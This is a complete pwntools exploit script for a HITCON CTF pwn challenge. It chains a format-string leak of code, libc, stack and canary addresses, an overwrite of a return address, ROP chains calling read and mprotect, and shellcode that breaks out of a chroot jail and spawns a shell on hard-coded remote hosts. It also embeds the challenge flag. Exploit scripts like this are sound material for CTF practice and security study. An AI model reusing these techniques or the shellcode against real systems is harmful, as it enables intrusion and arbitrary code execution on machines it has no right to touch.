#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

# hitcon{fOrMaT_StRiNg_bUg_iS_DeAd_buT_ItS_EvErYwHeRe_iN_CtF_ChAlLeNgEs_wTf}

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./initramfs/home/user/jail/lib/libc.so.6')

docker = 1

io = process("/usr/bin/echo")
io.close()

if docker == 0 :
    io = remote('34.80.100.212',30000)
    io.recvuntil("compute '", drop=True)
    q= process(io.recvuntil("'", drop=True), shell=True)
    q.recvuntil('hashcash token: ', drop=True)
    hash = q.recvuntil('\n', drop=True)
    io.sendline(hash)
    q.close()
else:
    #io = remote('0.0.0.0',30000)
    io = remote('210.30.97.133',28072)
io.sendlineafter(b"$",b"")
io.sendlineafter(b"$",b"")

if docker:
    io.sendlineafter(b"$",b"./sina")
    #io.sendlineafter(b"$",b"strace -ivt -xx -s 64 -o log1 ./sina")

else:
    io.sendlineafter(b"$",b"./sina")

#* 使用 _dl_fini+524 返回到main 并泄漏地址 
payload1 = b"%8c%32$hhn.%1$p..%3$p..%13$p.%7$lx"
io.sendline(payload1)

io.recvuntil(b"0x")
codebase = int(io.recvuntil(b"..", drop = True), 16) - 0x4040
libc.address = int(io.recvuntil(b"..", drop = True), 16) - 0xfda22
stack_address = int(io.recvuntil(b'.', drop = True), 16)
canary = int(io.recvuntil(b'\n', drop = True), 16)

success("codebase --> " + hex(codebase))
success("libc.address --> " + hex(libc.address))
success("stack_address --> " + hex(stack_address))
success("canary --> " + hex(canary))

target = stack_address - 0x210
start_addr = libc.address + 0x221a50

#* 设置栈指针链指向返回地址，利用_dl_fini+562
low1 = ((codebase+0x1159)-0x11b8)&0xffff
low2 = ((stack_address - 0x210) & 0xffff)
if low1<low2 :
    set_stack_ret2main = '%' + str(low1) +"c%10$hn%" + str(low2-low1) + "c%35$hn%2c%62$hnXYZ"
else :
    set_stack_ret2main = '%' + str(low2) +"c%35$hn%2c%62$hn%" + str(low1-low2-2) + "c%10$hnXYZ"

log.info("sending set_stack_ret2main")
pause()
io.sendline(set_stack_ret2main.encode())
io.recvuntil(b'XYZ', drop = True)

#* 覆盖返回地址为gets
low3 = libc.symbols['gets'] & 0xffff
low4 = (libc.symbols['gets'] >> 16) & 0xffff
if low3 < low4:
    ret2gets = "%" + str(low3) + "c%75$hn%" + str(low4 - low3) + "c%77$hnfusion%p"
else:
    ret2gets = "%" + str(low4) + "c%77$hn%" + str(low3 - low4) + "c%75$hnfusion%p"

#ret2gets = "%" + str(libc.sym['gets'] & 0xffffffff) + "c%75$nXYZ\n\x00"
context.log_level = 'info'
ret2gets = ret2gets.encode()
log.info("sending ret2gets")
pause()
io.sendline(ret2gets.ljust(0x3f,b'\x00'))
io.recvuntil(b"fusion0x", drop = True)

#* 由于rdi在栈上面，所以输入的rop会被破坏,在调用一次read溢出
ret = libc.address + 0x000000000002d4b6 # ret
pop_rdi = libc.address + 0x000000000002dad2 # pop rdi ; ret
pop_rsi = libc.address + 0x000000000002f2c1 # pop rsi ; ret
pop_rdx = libc.address + 0x00000000001002c2 # pop rdx ; ret
pop_rax = libc.address + 0x00000000000c8b75 # sub al, 0x75 ; pop rax ; ret
syscall_ret = libc.search(asm("syscall\nret")).__next__()
success("set breakpoint at --> " + hex(libc.address + 0x17d7ad))
success("pop_rdi --> " + hex(pop_rdi))
success("ret --> " + hex(ret))
jmp_rsp = libc.address + 0x000000000008c72d # jmp rsp

call_read_ROP = flat(
    pop_rdi,0,
    pop_rsi, stack_address-0x258+0x18 ,
    pop_rdx, 0x200,
    libc.sym['read'],
    ret 
)

payload = p64(ret) * (0x4e0>>3)
payload += call_read_ROP
log.info("sending call_read_ROP to gets")
if docker:
    log.warning("ret breakpoint at -->" + hex(ret))
pause()

# escape 0x7f for remote payload, because of qemu or strace...
## > https://github.com/nobodyisnobody/write-ups/blob/main/Hitcon.Quals.2023/pwn/Full.Chain.-.Wall.Sina/working.exploit.py
payloadc = b''
for c in payload:
  payloadc += b'\x16'+bytes([c])
io.sendline(payloadc)

#* ROP执行mprotect 然后jmp rsp
mprotect_ROP = flat(
    pop_rdi, (stack_address & 0xfffffffff000)- 0x1000,
    pop_rsi, 0x20000,
    pop_rdx, 0x7,
    pop_rax, 0xa,
    syscall_ret,
    jmp_rsp
)

shellcode = asm(shellcraft.mkdir("a",0o775) + shellcraft.chroot("a") + shellcraft.chroot("../../../../../../../../../../") + shellcraft.sh())

payload = p64(ret) 
payload += mprotect_ROP
payload += shellcode

context.log_level = 'debug'
log.info("sending mprotect_ROP and shellcode to read")
context.log_file="./debuglog.txt"
pause()
# escape 0x7f for remote payload, because of qemu or strace...
payloadc = b''
for c in payload:
  payloadc += b'\x16'+bytes([c])

io.sendline(payloadc)

#if docker:
#    io.sendline()
#    io.sendline()
#    io.sendline()
#    io.sendlineafter(b'$',b'cat log1')
#    output = io.recvuntil(b'killed by SIGSEGV +++')
#    with open('output.txt', 'wb') as f:
#        f.write(output)

io.interactive()
